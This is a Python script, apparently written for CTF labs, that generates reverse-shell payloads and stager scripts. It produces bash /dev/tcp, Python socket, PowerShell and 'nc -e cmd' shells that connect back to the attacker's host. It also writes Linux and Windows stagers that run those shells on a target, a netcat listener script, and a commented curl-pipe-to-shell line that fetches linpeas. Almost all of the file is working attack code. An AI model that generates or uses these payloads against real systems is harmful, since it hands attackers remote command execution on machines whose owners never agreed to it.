#!/usr/bin/env python3
import sys
import os
import re
import socket
import ipaddress
import argparse
from datetime import datetime

BANNER = r"""
=========================================================================================================
  SECTUMSEMPRA v1.1 - Automated Payload & Post-Exploitation Framework
=========================================================================================================
"""

def print_banner():
    print(BANNER)

def get_lhost():
    """Detect VPN (tun0) or fallback to local route."""
    try:
        import netifaces
        # Priority: tun0 (TryHackMe/HackTheBox VPN), then eth0, then wlan0
        for iface in ['tun0', 'tun1', 'eth0', 'wlan0', 'en0']:
            if iface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(iface)
                if socket.AF_INET in addrs:
                    return addrs[socket.AF_INET][0]['addr']
    except ImportError:
        pass
    except Exception:
        pass
    
    # Fallback: Connect to external IP to determine local route
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect(("1.1.1.1", 53))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return None

def validate_inputs(target, lport):
    """Validate target IP and port."""
    try:
        ipaddress.ip_address(target)
    except ValueError:
        print(f"[-] Invalid target IP: {target}")
        return False
    
    if not (1 <= lport <= 65535):
        print(f"[-] Invalid port: {lport} (must be 1-65535)")
        return False
    
    return True

def generate_payloads(target, lhost, lport):
    """Generate platform-specific reverse shells."""
    
    # Linux Bash TCP (no /dev/tcp dependency alternative included)
    linux_bash = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    linux_python = f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'"
    
    # PowerShell (fixed syntax - one-liner with proper encoding)
    win_ps = (
        f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$stream = $client.GetStream();"
        f"[byte[]]$bytes = 0..65535|%{{0}};"
        f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
        f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        f"$sendback = (iex $data 2>&1 | Out-String );"
        f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        f"$stream.Write($sendbyte,0,$sendbyte.Length);"
        f"$stream.Flush()}};"
        f"$client.Close()"
    )
    
    # Windows CMD (alternative if PowerShell blocked)
    win_cmd = f"nc.exe -e cmd {lhost} {lport}"  # Requires nc.exe on target
    
    return {
        "linux_bash": linux_bash,
        "linux_python": linux_python,
        "windows_ps": win_ps,
        "windows_cmd": win_cmd
    }

def write_linux_payload(target, lhost, lport, payloads):
    """Generate Linux stager script (to be run on target)."""
    filename = f"sectumsempra_linux_{target.replace('.', '_')}.sh"
    linpeas_url = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
    
    try:
        with open(filename, "w") as f:
            f.write("#!/bin/bash\n")
            f.write(f"# Sectumsempra Linux Stager\n")
            f.write(f"# Connects back to {lhost}:{lport}\n\n")
            
            f.write("# Attempt to spawn shell\n")
            f.write(f"({payloads['linux_bash']}) 2>/dev/null || ")
            f.write(f"({payloads['linux_python']}) 2>/dev/null || ")
            f.write("echo 'Failed to spawn shell' && exit 1\n\n")
            
            # Note: The following runs AFTER shell exits (if it ever does)
            # For CTFs, usually you'd run linpeas manually after getting the shell
            f.write(f"# If we get here, download and run linpeas (optional)\n")
            f.write(f"# curl -sL {linpeas_url} | sh\n")
            
        os.chmod(filename, 0o755)  # Make executable
        return filename
    except Exception as e:
        print(f"[-] Error writing Linux payload: {e}")
        return None

def write_windows_payload(target, lhost, lport, payloads):
    """Generate Windows stager script (to be run on target)."""
    filename = f"sectumsempra_windows_{target.replace('.', '_')}.ps1"
    winpeas_url = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe"
    
    try:
        with open(filename, "w") as f:
            f.write("# Sectumsempra Windows Stager\n")
            f.write(f"# Connects back to {lhost}:{lport}\n\n")
            
            # Option 1: Pure PowerShell (no file drop)
            f.write("# Method 1: PowerShell TCP (preferred - no disk writes)\n")
            f.write(f"{payloads['windows_ps']}\n\n")
            
            # Option 2: If PS fails, download nc.exe and use that
            f.write("# Method 2: Netcat fallback (requires nc.exe)\n")
            f.write("# (Invoke-WebRequest ... nc.exe ...)\n")
            
        return filename
    except Exception as e:
        print(f"[-] Error writing Windows payload: {e}")
        return None

def write_listener_script(lport):
    """Generate helper script for attacker machine."""
    filename = f"start_listener_{lport}.sh"
    with open(filename, "w") as f:
        f.write("#!/bin/bash\n")
        f.write(f"# Listener for port {lport}\n")
        f.write(f"echo 'Starting listener on {lport}...'\n")
        f.write(f"nc -lvnp {lport}\n")
    os.chmod(filename, 0o755)
    return filename

def main():
    parser = argparse.ArgumentParser(description='Sectumsempra - Payload Generator')
    parser.add_argument('-t', '--target', help='Target IP (RHOST)')
    parser.add_argument('-l', '--lhost', help='Your IP (LHOST)')
    parser.add_argument('-p', '--lport', type=int, default=4444, help='Listener port (LPORT)')
    args = parser.parse_args()
    
    print_banner()
    
    # Get LHOST
    lhost = args.lhost or get_lhost()
    if not lhost:
        print("[-] Could not detect LHOST. Use -l to specify manually.")
        sys.exit(1)
    
    print(f"[*] LHOST: {lhost}")
    
    # Get target
    target = args.target or input("[?] Target IP (RHOST): ").strip()
    lport = args.lport
    
    if not validate_inputs(target, lport):
        sys.exit(1)
    
    print(f"[*] Generating payloads for {target} -> {lhost}:{lport}")
    
    payloads = generate_payloads(target, lhost, lport)
    
    # Generate files
    linux_file = write_linux_payload(target, lhost, lport, payloads)
    win_file = write_windows_payload(target, lhost, lport, payloads)
    listener_file = write_listener_script(lport)
    
    if linux_file and win_file:
        print(f"\n[+] Generated payloads:")
        print(f"    Linux:   ./{linux_file}")
        print(f"    Windows: ./{win_file}")
        print(f"\n[+] Listener helper: ./{listener_file}")
        print(f"\n[*] Next steps:")
        print(f"    1. Start listener: nc -lvnp {lport}")
        print(f"    2. Transfer payload to target")
        print(f"    3. Execute on target")
        print(f"\n[*] One-liners for target execution:")
        print(f"    Linux:   {payloads['linux_bash']}")
        print(f"    Windows: powershell -c '{payloads['windows_ps'][:80]}...'")

if __name__ == "__main__":
    main()
